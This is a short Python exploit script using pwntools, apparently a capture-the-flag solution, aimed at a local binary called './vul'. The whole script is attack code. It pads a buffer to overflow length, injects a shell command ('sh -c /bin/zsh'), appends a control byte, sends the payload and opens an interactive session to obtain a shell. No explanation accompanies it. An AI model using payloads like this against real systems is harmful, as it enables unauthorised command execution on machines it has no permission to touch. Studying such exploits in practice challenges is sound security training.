from pwn import *

conn = process('./vul')

payload = 'nv sh -c /bin/zsh ' + 'A' * (256 - 18 - 2 - 1) + '|\x01'

sleep(0.5)
conn.sendline(payload)
sleep(0.5)

conn.interactive()